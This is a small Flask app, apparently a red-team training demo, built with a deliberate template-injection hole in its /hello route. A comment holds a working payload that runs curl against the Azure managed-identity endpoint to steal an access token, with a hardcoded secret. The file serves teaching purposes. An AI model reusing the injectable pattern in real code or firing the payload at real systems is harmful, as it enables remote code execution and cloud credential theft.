import os

from flask import Flask, render_template, request, send_from_directory, url_for, redirect, render_template_string


app = Flask(__name__)


@app.route('/')
def index():
   print('Request for index page received')
   return render_template('index.html')

@app.route('/favicon.ico')
def favicon():
    return send_from_directory(os.path.join(app.root_path, 'static'),
                               'favicon.ico', mimetype='image/vnd.microsoft.icon')

@app.route('/hello', methods=['POST'])
def hello():
   name = request.form.get('name')
   if name:
       # Vulnerable template rendering
       template = f'<h1><center><h1>EPAM Red Team</h1><img src="/static/images/logo.jpg"></img><hr><br>Knowlege sharing session<hr> Hello {name}!</h1>'
       return render_template_string(template)
   else:
       return redirect(url_for('index'))

# {{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl "http://169.254.131.5:8081/msi/token?api-version=2017-09-01&resource=https://management.azure.com" -H secret:"922c26e8-8192-4036-a6b9-0b3d8656416c"').read() }}

if __name__ == '__main__':
   app.run()
